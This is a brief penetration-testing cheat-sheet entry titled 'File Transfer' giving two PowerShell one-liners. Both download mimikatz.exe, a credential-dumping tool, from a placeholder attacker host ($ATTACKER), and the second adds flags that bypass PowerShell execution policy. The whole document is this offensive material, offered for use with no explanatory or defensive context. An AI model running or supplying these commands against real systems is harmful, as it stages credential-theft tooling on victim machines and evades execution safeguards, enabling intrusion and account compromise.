# File Transfer

## Powershell

```text
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/mimikatz.exe','mimikatz.exe')
powershell -exec bypass -nop (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/mimikatz.exe','mimikatz.exe')
```

